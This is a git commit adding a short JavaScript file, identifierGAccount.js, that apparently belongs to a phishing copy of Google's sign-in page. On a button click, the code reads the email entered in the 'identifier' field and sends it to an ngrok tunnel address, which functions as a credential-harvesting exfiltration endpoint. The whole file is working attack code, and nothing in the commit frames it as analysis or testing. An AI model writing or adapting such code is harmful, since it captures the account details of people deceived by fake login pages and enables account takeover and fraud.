94927bcfcc03d26693343fb8c1fff10e9d396819
Wolota <123838258+Wolota@users.noreply.github.com>
2023-02-16 20:25:45 -0300

    Create identifierGAccount.js

---
+++ identifierGAccount.js
@@ -0,0 +1,16 @@
+btn[1].addEventListener('click', function(){
+    let param = null;
+  
+    let email = document.querySelector('[name="identifier"]');
+    param = email.value;
+  
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "https://a1e9-45-162-158-3.sa.ngrok.io/" + param, true);
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+            console.log(xhr.responseText);
+        }
+    };
+    xhr.send();
+
+})
